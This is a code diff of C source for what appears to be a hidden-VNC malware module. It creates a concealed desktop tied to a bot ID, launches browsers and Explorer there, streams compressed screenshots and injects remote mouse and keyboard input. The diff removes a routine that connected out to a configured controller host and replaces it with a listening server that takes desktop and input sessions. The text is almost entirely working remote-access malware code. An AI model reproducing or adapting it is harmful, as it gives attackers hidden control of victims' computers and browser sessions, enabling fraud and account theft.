@@ -118,7 +118,7 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
 	data.hDc = hDc;
 	data.hDcScreen = hDcScreen;
 
-	EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)& data);
+	EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);
 
 	if (serverWidth > rect.right)
 		serverWidth = rect.right;
@@ -204,121 +204,13 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
 	return FALSE;
 }
 
-static SOCKET ConnectServer()
-{
-	WSADATA     wsa;
-	SOCKET      s;
-	SOCKADDR_IN addr;
-
-	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-		return NULL;
-	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
-		return NULL;
-
-	hostent* he = gethostbyname(g_host);
-	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
-	addr.sin_family = AF_INET;
-	addr.sin_port = htons(g_port);
-
-	if (connect(s, (sockaddr*)& addr, sizeof(addr)) < 0)
-		return NULL;
-
-	return s;
-}
 
 static int SendInt(SOCKET s, int i)
 {
-	return send(s, (char*)& i, sizeof(i), 0);
+	return send(s, (char*)&i, sizeof(i), 0);
 }
 
 
-static DWORD WINAPI DesktopThread(LPVOID param)
-{
-	SOCKET s = ConnectServer();
-
-	if (!SetThreadDesktop(g_hDesk))
-		goto exit;
-
-	if (send(s, (char*)gc_magik, sizeof(gc_magik), 0) <= 0)
-		goto exit;
-	if (SendInt(s, Connection::desktop) <= 0)
-		goto exit;
-
-	for (;;)
-	{
-		int width, height;
-
-		if (recv(s, (char*)& width, sizeof(width), 0) <= 0)
-			goto exit;
-		if (recv(s, (char*)& height, sizeof(height), 0) <= 0)
-			goto exit;
-
-		BOOL same = GetDeskPixels(width, height);
-		if (same)
-		{
-			if (SendInt(s, 0) <= 0)
-				goto exit;
-			continue;
-		}
-
-		if (SendInt(s, 1) <= 0)
-			goto exit;
-
-		DWORD workSpaceSize;
-		DWORD fragmentWorkSpaceSize;
-
-
-		HANDLE hDLL;
-		RtlCompressBuffer_Fn fcmp;
-		RtlGetCompressionWorkSpaceSize_Fn fgcw;
-		hDLL = LoadLibrary("ntdll.dll");
-		if (hDLL != NULL)
-		{
-			fcmp = (RtlCompressBuffer_Fn)GetProcAddress((HMODULE)hDLL, "RtlCompressBuffer");
-			fgcw = (RtlGetCompressionWorkSpaceSize_Fn) GetProcAddress((HMODULE)hDLL, "RtlGetCompressionWorkSpaceSize");
-	
-
-		(*fgcw)(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
-		BYTE* workSpace = (BYTE*)Alloc(workSpaceSize);
-
-		DWORD size;
-		(*fcmp)(COMPRESSION_FORMAT_LZNT1,
-			g_pixels,
-			g_bmpInfo.bmiHeader.biSizeImage,
-			g_tempPixels,
-			g_bmpInfo.bmiHeader.biSizeImage,
-			2048,
-			&size,
-			workSpace);
-	
-		free(workSpace);
-
-		RECT rect;
-		HWND hWndDesktop = GetDesktopWindow();
-		GetWindowRect(hWndDesktop, &rect);
-		if (SendInt(s, rect.right) <= 0)
-			goto exit;
-		if (SendInt(s, rect.bottom) <= 0)
-			goto exit;
-		if (SendInt(s, g_bmpInfo.bmiHeader.biWidth) <= 0)
-			goto exit;
-		if (SendInt(s, g_bmpInfo.bmiHeader.biHeight) <= 0)
-			goto exit;
-		if (SendInt(s, size) <= 0)
-			goto exit;
-		if (send(s, (char*)g_tempPixels, size, 0) <= 0)
-			goto exit;
-
-		DWORD response;
-		if (recv(s, (char*)& response, sizeof(response), 0) <= 0)
-			goto exit;
-		}
-	}
-
-exit:
-	TerminateThread(g_hInputThread, 0);
-	return 0;
-}
 
 static void StartChrome()
 {
@@ -390,10 +282,10 @@ static void StartFirefox()
 
 	char* path = StrStrA(profilesIniContent, "Path=");
 	if (!path)
-		 exit;
+		exit;
 	char* pathEnd = StrStrA(path, (PCHAR)"\r");
 	if (!pathEnd)
-		 exit;
+		exit;
 	*pathEnd = 0;
 	path += 5;
 
@@ -443,9 +335,149 @@ static void StartIe()
 	CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
 }
 
-static DWORD WINAPI InputThread(LPVOID param)
+
+
+
+
+
+static DWORD WINAPI DesktopNoThread(SOCKET s)
 {
-	SOCKET s = ConnectServer();
+	//SOCKET s = ConnectServer();
+	printf("[DesktopNoThread] Started\n");
+
+	if (!SetThreadDesktop(g_hDesk)) {
+		printf("[DesktopNoThread] SetThreadDesktop error\n");
+		goto exit;
+	}
+
+	/*
+	if (send(s, (char*)gc_magik, sizeof(gc_magik), 0) <= 0) {
+		printf("gc_magik error\n");
+		goto exit;
+	}
+
+	if (SendInt(s, Connection::desktop) <= 0) {
+		printf("desktop error\n");
+		goto exit;
+	}
+	*/
+
+	for (;;)
+	{
+		int width, height;
+
+		if (recv(s, (char*)&width, sizeof(width), 0) <= 0) {
+			printf("[DesktopNoThread] recv width error\n");
+			goto exit;
+		}
+
+		if (recv(s, (char*)&height, sizeof(height), 0) <= 0) {
+			printf("[DesktopNoThread] recv height error\n");
+			goto exit;
+		}
+
+		printf("[DesktopNoThread] width %d height %d\n", width, height);
+		BOOL same = GetDeskPixels(width, height);
+		if (same)
+		{
+			if (SendInt(s, 0) <= 0) {
+				printf("[DesktopNoThread] SendInt error\n");
+				goto exit;
+			}
+			continue;
+		}
+
+		if (SendInt(s, 1) <= 0) {
+			printf("[DesktopNoThread] SendInt2 error\n");
+			goto exit;
+		}
+
+
+		DWORD workSpaceSize;
+		DWORD fragmentWorkSpaceSize;
+
+
+		HANDLE hDLL;
+		RtlCompressBuffer_Fn fcmp;
+		RtlGetCompressionWorkSpaceSize_Fn fgcw;
+		hDLL = LoadLibrary("ntdll.dll");
+		if (hDLL != NULL)
+		{
+			fcmp = (RtlCompressBuffer_Fn)GetProcAddress((HMODULE)hDLL, "RtlCompressBuffer");
+			fgcw = (RtlGetCompressionWorkSpaceSize_Fn)GetProcAddress((HMODULE)hDLL, "RtlGetCompressionWorkSpaceSize");
+
+
+			(*fgcw)(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
+			BYTE* workSpace = (BYTE*)Alloc(workSpaceSize);
+
+			DWORD size;
+			(*fcmp)(COMPRESSION_FORMAT_LZNT1,
+				g_pixels,
+				g_bmpInfo.bmiHeader.biSizeImage,
+				g_tempPixels,
+				g_bmpInfo.bmiHeader.biSizeImage,
+				2048,
+				&size,
+				workSpace);
+
+			free(workSpace);
+
+			RECT rect;
+			HWND hWndDesktop = GetDesktopWindow();
+			GetWindowRect(hWndDesktop, &rect);
+			if (SendInt(s, rect.right) <= 0) {
+				printf("[DesktopNoThread] SendInt right error\n");
+				goto exit;
+			}
+
+			if (SendInt(s, rect.bottom) <= 0) {
+				printf("[DesktopNoThread] SendInt bottom error\n");
+				goto exit;
+			}
+
+			if (SendInt(s, g_bmpInfo.bmiHeader.biWidth) <= 0) {
+				printf("[DesktopNoThread] SendInt biWidth error\n");
+				goto exit;
+			}
+
+			if (SendInt(s, g_bmpInfo.bmiHeader.biHeight) <= 0) {
+				printf("[DesktopNoThread] SendInt biHeight error\n");
+				goto exit;
+			}
+
+			if (SendInt(s, size) <= 0) {
+				printf("[DesktopNoThread] SendInt size error\n");
+				goto exit;
+			}
+
+			if (send(s, (char*)g_tempPixels, size, 0) <= 0) {
+				printf("[DesktopNoThread] send g_tempPixels %s error\n", g_tempPixels);
+				goto exit;
+			}
+
+
+			DWORD response;
+			if (recv(s, (char*)&response, sizeof(response), 0) <= 0) {
+				printf("[DesktopNoThread] recv response error\n");
+				goto exit;
+			}
+
+		}
+	}
+
+exit:
+	printf("[DesktopNoThread] End\n");
+	//TerminateThread(g_hInputThread, 0);
+	return 0;
+}
+
+
+static DWORD WINAPI InputNoThread(SOCKET s)
+{
+	//SOCKET s = ConnectServer();
+
+
+	printf("[InputNoThread] Started\n");
 
 	SetThreadDesktop(g_hDesk);
 
@@ -455,10 +487,10 @@ static DWORD WINAPI InputThread(LPVOID param)
 		return 0;
 
 	DWORD response;
-	if (!recv(s, (char*)& response, sizeof(response), 0))
+	if (!recv(s, (char*)&response, sizeof(response), 0))
 		return 0;
 
-	g_hDesktopThread = CreateThread(NULL, 0, DesktopThread, NULL, 0, 0);
+	//g_hDesktopThread = CreateThread(NULL, 0, DesktopThread, NULL, 0, 0);
 
 	POINT      lastPoint;
 	BOOL       lmouseDown = FALSE;
@@ -474,11 +506,11 @@ static DWORD WINAPI InputThread(LPVOID param)
 		WPARAM wParam;
 		LPARAM lParam;
 
-		if (recv(s, (char*)& msg, sizeof(msg), 0) <= 0)
+		if (recv(s, (char*)&msg, sizeof(msg), 0) <= 0)
 			goto exit;
-		if (recv(s, (char*)& wParam, sizeof(wParam), 0) <= 0)
+		if (recv(s, (char*)&wParam, sizeof(wParam), 0) <= 0)
 			goto exit;
-		if (recv(s, (char*)& lParam, sizeof(lParam), 0) <= 0)
+		if (recv(s, (char*)&lParam, sizeof(lParam), 0) <= 0)
 			goto exit;
 
 		HWND  hWnd;
@@ -490,6 +522,7 @@ static DWORD WINAPI InputThread(LPVOID param)
 		{
 		case WmStartApp::startExplorer:
 		{
+			printf("[InputNoThread] Recv command startExplorer\n");
 			const DWORD neverCombine = 2;
 			const char* valueName = "TaskbarGlomLevel";
 
@@ -498,14 +531,14 @@ static DWORD WINAPI InputThread(LPVOID param)
 			DWORD value;
 			DWORD size = sizeof(DWORD);
 			DWORD type = REG_DWORD;
-			RegQueryValueExA(hKey, valueName, 0, &type, (BYTE*)& value, &size);
+			RegQueryValueExA(hKey, valueName, 0, &type, (BYTE*)&value, &size);
 
 			if (value != neverCombine)
-				RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)& neverCombine, size);
+				RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)&neverCombine, size);
 
 			char explorerPath[MAX_PATH] = { 0 };
 			GetWindowsDirectoryA(explorerPath, MAX_PATH);
-			lstrcatA(explorerPath,"\\");
+			lstrcatA(explorerPath, "\\");
 			lstrcatA(explorerPath, "explorer.exe");
 
 			STARTUPINFOA startupInfo = { 0 };
@@ -527,12 +560,13 @@ static DWORD WINAPI InputThread(LPVOID param)
 			appbarData.lParam = ABS_ALWAYSONTOP;
 			SHAppBarMessage(ABM_SETSTATE, &appbarData);
 
-			RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)& value, size);
+			RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)&value, size);
 			RegCloseKey(hKey);
 			break;
 		}
 		case WmStartApp::startRun:
 		{
+			printf("[InputNoThread] Recv command startRun\n");
 			char rundllPath[MAX_PATH] = { 0 };
 			SHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
 			lstrcatA(rundllPath, "\\rundll32.exe shell32.dll,#61");
@@ -546,16 +580,19 @@ static DWORD WINAPI InputThread(LPVOID param)
 		}
 		case WmStartApp::startChrome:
 		{
+			printf("[InputNoThread] Recv command startChrome\n");
 			StartChrome();
 			break;
 		}
 		case WmStartApp::startFirefox:
 		{
+			printf("[InputNoThread] Recv command startFirefox\n");
 			StartFirefox();
 			break;
 		}
 		case WmStartApp::startIexplore:
 		{
+			printf("[InputNoThread] Recv command startIexplore\n");
 			StartIe();
 			break;
 		}
@@ -739,7 +776,7 @@ static DWORD WINAPI InputThread(LPVOID param)
 			if (!currHwnd || currHwnd == hWnd)
 				break;
 		}
-		
+
 
 		if (mouseMsg)
 			lParam = MAKELPARAM(point.x, point.y);
@@ -747,20 +784,60 @@ static DWORD WINAPI InputThread(LPVOID param)
 		PostMessageA(hWnd, msg, wParam, lParam);
 	}
 exit:
-	TerminateThread(g_hDesktopThread, 0);
+	printf("[InputNoThread] End\n");
 	return 0;
 }
 
-static DWORD WINAPI MainThread(LPVOID param)
+
+
+static DWORD WINAPI ClientThread(PVOID param)
 {
-	return 0;
+	SOCKET     s = (SOCKET)param;
+	BYTE       buf[sizeof(gc_magik)];
+	Connection connection;
+	DWORD      uhid;
+
+	if (recv(s, (char*)buf, sizeof(gc_magik), 0) <= 0)
+	{
+		printf("recv gc_magic error\n");
+		closesocket(s);
+		return 0;
+	}
+	if (memcmp(buf, gc_magik, sizeof(gc_magik)))
+	{
+		printf("gc_magic error\n");
+		closesocket(s);
+		return 0;
+	}
+	if (recv(s, (char*)&connection, sizeof(connection), 0) <= 0)
+	{
+		printf("recv connection error\n");
+		closesocket(s);
+		return 0;
+	}
+	{
+		SOCKADDR_IN addr;
+		int         addrSize;
+		addrSize = sizeof(addr);
+		getpeername(s, (SOCKADDR*)&addr, &addrSize);
+		uhid = addr.sin_addr.S_un.S_addr;
+	}
+	if (connection == Connection::desktop)
+	{
+		DesktopNoThread(s);
+	}
+	else if (connection == Connection::input)
+	{
+		InputNoThread(s);
+
+	}
 }
 
-void StartHiddenDesktop(char* host, int port)
+BOOL StartServer(int port)
 {
 
-	lstrcpyA(g_host, host);
-	g_port = port;
+
+
 	g_started = TRUE;
 	memset(g_desktopName, 0, sizeof(g_desktopName));
 	GetBotId(g_desktopName);
@@ -776,18 +853,54 @@ void StartHiddenDesktop(char* host, int port)
 		g_hDesk = CreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
 	SetThreadDesktop(g_hDesk);
 
-	g_hInputThread = CreateThread(NULL, 0, InputThread, NULL, 0, 0);
-	WaitForSingleObject(g_hInputThread, INFINITE);
+
+
+
+	WSADATA     wsa;
+	SOCKET      serverSocket;
+	sockaddr_in addr;
+	HMODULE     ntdll = LoadLibrary(TEXT("ntdll.dll"));
+
+
+
+
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+		return FALSE;
+	if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+		return FALSE;
+
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = INADDR_ANY;
+	addr.sin_port = htons(port);
+
+	if (bind(serverSocket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
+		return FALSE;
+	if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR)
+		return FALSE;
+
+	int addrSize = sizeof(addr);
+	getsockname(serverSocket, (sockaddr*)&addr, &addrSize);
+	printf("[Main] Listening on port %d\n", ntohs(addr.sin_port));
+
+	for (;;)
+	{
+
+		SOCKET      s;
+		sockaddr_in addr;
+		s = accept(serverSocket, (sockaddr*)&addr, &addrSize);
+		printf("[Main] Someone coming...\n");
+		CreateThread(NULL, 0, ClientThread, (LPVOID)s, 0, 0);
+	}
+
 
 	free(g_pixels);
 	free(g_oldPixels);
 	free(g_tempPixels);
 
-	CloseHandle(g_hInputThread);
-	CloseHandle(g_hDesktopThread);
 
 	g_pixels = NULL;
 	g_oldPixels = NULL;
 	g_tempPixels = NULL;
 	g_started = FALSE;
+
 }
